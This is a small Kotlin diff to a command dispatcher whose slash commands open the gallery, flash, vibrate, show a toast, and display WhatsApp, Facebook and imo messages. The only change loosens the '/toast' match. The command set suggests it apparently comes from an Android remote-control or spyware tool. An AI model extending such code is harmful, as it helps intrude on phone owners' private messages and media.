@@ -243,7 +243,7 @@ private fun handle(raw: String) {
         cmd == "/gallery" -> gallery()
         cmd == "/flash" -> flash()
         cmd == "/vibrate" -> vibrate()
-        cmd == "/toast" -> toast(arg)
+        cmd.startsWith("/toast") -> toast(arg)
         cmd == "/whatsapp" -> showMessages("whatsapp")
         cmd == "/fb" -> showMessages("fb")
         cmd == "/imo" -> showMessages("imo")
